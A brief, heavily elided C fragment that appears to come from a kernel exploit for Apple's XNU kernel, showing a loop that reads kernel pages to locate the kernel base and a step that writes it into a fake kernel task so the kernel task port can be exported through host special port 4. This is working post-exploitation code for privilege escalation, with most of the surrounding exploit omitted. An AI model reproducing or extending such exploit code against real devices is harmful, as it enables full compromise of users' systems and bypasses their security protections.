...
disable_free:
	...
	for (;; kernel_page -= page_size) {
		...
		uint32_t data[4] = {};
		ok = kernel_read(kernel_page, data, sizeof(data));
	...
	INFO("kernel base: 0x%016llx", kernel_base);

	// 40. Export the kernel task port via host special port 4.
	kernel_write64(fake_kernel_task_address + OFFSET(task, all_image_info_addr), kernel_base);
